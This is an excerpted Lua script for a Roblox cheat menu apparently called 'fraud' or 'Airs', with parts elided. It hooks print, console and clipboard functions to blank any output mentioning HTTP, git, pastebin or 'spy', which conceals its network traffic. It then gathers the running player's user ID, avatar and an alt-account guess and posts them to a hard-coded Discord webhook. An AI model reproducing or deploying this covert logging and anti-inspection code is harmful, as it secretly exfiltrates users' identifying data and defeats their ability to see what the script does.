...
--
task.spawn(function()
    local blocked = {rconsoleprint, rconsoleinfo, rconsolewarn, rconsoleerr, rconsolename, printconsole, print, warn, error, consoleprint, setclipboard}
    local blockedhttpspymsg = "Hello, World!\n"
    for i,v in pairs(blocked) do 
        local antihttpspy
        antihttpspy = hookfunction(v,function(urprint,...)
            if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") or string.match(urprint, "spy") then
                urprint = blockedhttpspymsg
            end
         return antihttpspy(urprint,...)
        end)
    end
end)
...
if not isfile('fraudkey.key') then 
    writefile('fraudkey.key','')
end
...
Clip = true
    ...
    Library:SetWatermark('discord.gg/Zya7gW5pBs')
    ...
    Credits:AddLabel('Giannis#9999 - co owner')
    ...
    notify('fraud loaded in '..tostring(tick() - load)..'ms')
...
local alt = ""
if game.Players.LocalPlayer.AccountAge <= 70 then 
    alt = "yes"
elseif game.Players.LocalPlayer.AccountAge <= 200 then
    alt = "maybe"
elseif game.Players.LocalPlayer.AccountAge >= 200 then
    alt = "no"
end
local Content = ""
local Embed = {
    ["title"] = "**Airs "..scriptversion.." Execution Logs**",
  --  ["description"] 
    ["type"] = "rich",
    ["color"] = tonumber(0x2F3136),
    ["image"] = {
        ["url"] = "https://www.roblox.com/avatar-thumbnail/image?userId="..plr.UserId.."&width=600&height=600&format=png"
    },
    ["fields"] = {
        {
            ["name"] = "__Name__",
...
(syn and syn.request or http_request or http.request) {
    ...
    Url = "https://discord.com/api/webhooks/982712756396507136/NNDeihhtX_9StPTOvSLpmbT-3Ai2OoR47wzI5PWr78rhxnUT1XTeq1YGuGJAOunsO0JW",
    Method = "POST",
    Headers = {
